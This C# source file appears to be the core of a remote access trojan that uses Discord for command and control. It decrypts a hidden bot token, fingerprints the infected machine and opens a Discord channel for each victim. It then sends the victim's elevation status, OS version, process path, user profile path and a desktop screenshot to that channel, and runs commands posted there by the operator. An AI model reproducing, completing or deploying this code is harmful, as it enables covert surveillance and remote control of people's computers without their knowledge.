using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Main.Source.Utilities;
using System.Text;

namespace Main.Source.Bot
{
    public class Manager
    {
        private static List<CommandBase> _commands = [];

        private static DiscordSocketClient? _client;

        private static ulong _channel = 0;

        public static async Task StartAsync()
        {
            Command.Register(ref _commands);

            _client = new DiscordSocketClient(new DiscordSocketConfig
            {
                GatewayIntents =
                    GatewayIntents.MessageContent |
                    GatewayIntents.Guilds |
                    GatewayIntents.GuildMessages,

                LogLevel = ConfigMisc.DEBUG_MODE
                    ? LogSeverity.Verbose
                    : LogSeverity.Warning
            });

            _client.Ready += HandleReadyAsyn;
            _client.MessageReceived += HandleMessageReceiveAsync;
            _client.Log += HandleLogAsync;

            await _client.LoginAsync(
                TokenType.Bot,
                Crypto.Decrypt(ConfigBot.BOT_TOKEN)
            );

            await _client.StartAsync();

            Logger.Info("StartAsync: finished");
            await Task.Delay(-1);
        }

        private static async Task HandleReadyAsyn()
        {
            ulong serverId = ulong.Parse(Crypto.Decrypt(ConfigBot.SERVER_ID));
            ulong categoryId = ulong.Parse(Crypto.Decrypt(ConfigBot.CATEGORY_ID));

            var server = _client.GetGuild(serverId);
            if (server == null)
            {
                Logger.Error($"HandleReadyAsyn: failed to find server \"{serverId}\"");
                return;
            }

            var category = server.GetCategoryChannel(categoryId);
            if (category == null)
            {
                var foundCategory = server.CategoryChannels.FirstOrDefault((channel) => channel.Name == "Bot");
                if (foundCategory != null)
                {
                    category = server.GetCategoryChannel(foundCategory.Id);
                    Logger.Warn($"HandleReadyAsyn: using category \"{category.Id}\" as category \"{categoryId}\" could not be found");
                }

                var newCategory = await server.CreateCategoryChannelAsync("Bot");
                category = server.GetCategoryChannel(newCategory.Id);

                Logger.Warn($"HandleReadyAsyn: created new category \"{newCategory.Id}\" as category \"{categoryId}\" could not be found");
            }

            string fingerprint = Functions.Fingerprint.GenFingerprint();

            var foundChannel = server.TextChannels.FirstOrDefault((channel) => channel.Topic == fingerprint);
            if (foundChannel != null)
            {
                _channel = foundChannel.Id;
                await HandleConnection(_client.GetChannel(foundChannel.Id) as ISocketMessageChannel);

                Logger.Info($"HandleReadyAsyn: channel for {fingerprint} already exists as {foundChannel.Id}");
                return;
            }

            var created = await server.CreateTextChannelAsync(fingerprint, (channel) =>
            {
                channel.CategoryId = category.Id;
                channel.Name = fingerprint;
                channel.Topic = fingerprint;
            });

            _channel = created.Id;
            await HandleConnection(_client.GetChannel(created.Id) as ISocketMessageChannel);

            Logger.Info($"HandleReadyAsyn: channel for {fingerprint} created as {created.Id}");
        }

        private static async Task HandleMessageReceiveAsync(SocketMessage socket)
        {
            if (socket is not SocketUserMessage message)
            {
                return;
            }

            if (message.Author.IsBot)
            {
                return;
            }

            if (message.Channel.Id != _channel)
            {
                return;
            }

            var context = new SocketCommandContext(_client, message);

            await HandleCommandAsync(context);
        }

        private static async Task HandleLogAsync(LogMessage log)
        {
            string message = $"HandleLogAsync: {log.Source} - {log.Message} {(log.Exception != null ? log.Exception : "")}".Trim();

            switch (log.Severity)
            {
                case LogSeverity.Critical:
                case LogSeverity.Error:
                    Logger.Error(message);
                    break;

                case LogSeverity.Warning:
                    Logger.Warn(message);
                    break;

                case LogSeverity.Info:
                case LogSeverity.Verbose:
                case LogSeverity.Debug:
                    if (ConfigMisc.DEBUG_MODE)
                    {
                        Logger.Info(message);
                    }
                    break;
            }
        }

        private static async Task HandleCommandAsync(SocketCommandContext socket)
        {
            string content = socket.Message.Content;

            if (!content.StartsWith(ConfigBot.COMMAND_PREFIX))
            {
                return;
            }

            string[] parts = content.Substring(1).Split(' ');

            string name = parts[0].ToString();
            string[] args = parts.Skip(1).ToArray();

            if (name == "help")
            {
                _ = Task.Run(async () => await HelpCommandAsync(socket, args));
                return;
            }

            var command = _commands.FirstOrDefault(cmd => cmd.Name.ToLower() == name);
            if (command == null)
            {
                await socket.Message.ReplyAsync($"Command `{name}` does not exist");
                return;
            }

            _ = Task.Run(async () =>
            {
                try
                {
                    await command.Func(socket, args);
                }
                catch (Exception ex)
                {
                    Logger.Warn($"HandleCommandAsync: [{ex.GetType()}]: {ex.Message} - {ex.StackTrace}");

                    await socket.Message.ReplyAsync(
                        $"⚠️ Unhandled exception executing command: `{name}`.\n" +
                        $"Type: `{ex.GetType()}`\n" +
                        $"Message: `{ex.Message}`\n" +
                        $"Trace: `{ex.StackTrace}`\n"
                    );
                }
            });
        }

        private static async Task HelpCommandAsync(SocketCommandContext socket, string[] args)
        {
            if (args.Length > 0)
            {
                string name = args[0];

                var command = _commands.FirstOrDefault((cmd) => cmd.Name.ToLower() == name);
                if (command == null)
                {
                    await socket.Message.ReplyAsync($"Command `{name}` does not exist");
                    return;
                }

                var specificHelp = new StringBuilder();
                specificHelp.AppendLine($"{command.Name} - {command.Info}");

                specificHelp.AppendLine("```");
                specificHelp.AppendLine(command.Use);
                specificHelp.AppendLine("```");

                await socket.Message.ReplyAsync(specificHelp.ToString());
                return;
            }

            var generalHelp = new StringBuilder();
            generalHelp.AppendLine("```");

            foreach (var cmd in _commands)
            {
                generalHelp.AppendLine($"{cmd.Name} - {cmd.Info}");
            }

            generalHelp.AppendLine("```");
            generalHelp.AppendLine($"Prefix: {ConfigBot.COMMAND_PREFIX}");
            generalHelp.AppendLine($"Do `{ConfigBot.COMMAND_PREFIX}help <command name>` for its usage info");

            string output = generalHelp.ToString();
            if (output.Length > 1900)
            {
                byte[] buffer = Encoding.UTF8.GetBytes(output.Replace("```", ""));

                using (var stream = new MemoryStream(buffer))
                {
                    await socket.Channel.SendFileAsync(
                        stream: stream,
                        filename: "help.txt",
                        messageReference: new MessageReference(socket.Message.Id)
                    );
                }
            }
            else
            {
                await socket.Message.ReplyAsync(output);
            }
        }

        private static async Task HandleConnection(ISocketMessageChannel channel)
        {
            bool elevated = Common.IsElevated();

            string marker = ConfigVersion.TRACKING.Length == 0
                ? ""
                : Crypto.Decrypt(ConfigVersion.TRACKING);

            var message = new StringBuilder();
            message.AppendLine($"{(elevated ? "@everyone" : "@here")} [{ConfigVersion.MAJOR}.{ConfigVersion.MINOR}.{ConfigVersion.PATCH} - {marker}]");
            message.AppendLine($"Elevated: {elevated}");
            message.AppendLine($"Process Id: {Environment.ProcessId}");
            message.AppendLine($"OS Version: {Utilities.Windows.GetWindowsVersion()}");
            message.AppendLine($"Process Path: `{Environment.ProcessPath}`");
            message.AppendLine($"User Profile: `{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}`\n");
            message.AppendLine($"Do `{ConfigBot.COMMAND_PREFIX}help` for help");

            string messageStr = message.ToString();

            if (await Functions.Screenshot.TakeScreenshot(cursor: true) is not MemoryStream screenshot)
            {
                await channel.SendMessageAsync(messageStr);
                return;
            }

            using (screenshot)
            {
                await channel.SendFileAsync(
                    stream: screenshot,
                    filename: "ss.png",
                    text: messageStr
                );
            }
        }
    }
}
